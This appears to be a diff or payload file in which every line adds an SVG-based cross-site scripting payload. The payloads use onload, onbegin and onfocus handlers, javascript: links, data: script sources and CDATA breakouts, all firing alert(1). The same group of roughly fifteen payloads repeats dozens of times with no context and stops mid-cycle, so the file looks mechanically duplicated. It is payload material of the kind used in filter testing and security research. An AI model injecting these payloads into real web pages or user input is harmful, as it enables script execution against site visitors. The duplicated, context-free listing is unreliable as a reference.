+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+<svg><a onfocus=alert(1) tabindex=1>test</a></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><text onmouseover=alert(1)>test</text></svg>
+<svg><script xlink:href="data:,alert(1)"></script></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><script>alert(1)</script></svg>
+<svg><style>{-webkit-animation-name:x}@-webkit-keyframes x{from{}}body{background:url(javascript:alert(1))}</style></svg>
+<svg><animate attributeName="onload" from="alert(1)" to="alert(1)" /></svg>
+<svg><set attributeName="onload" to="alert(1)" /></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
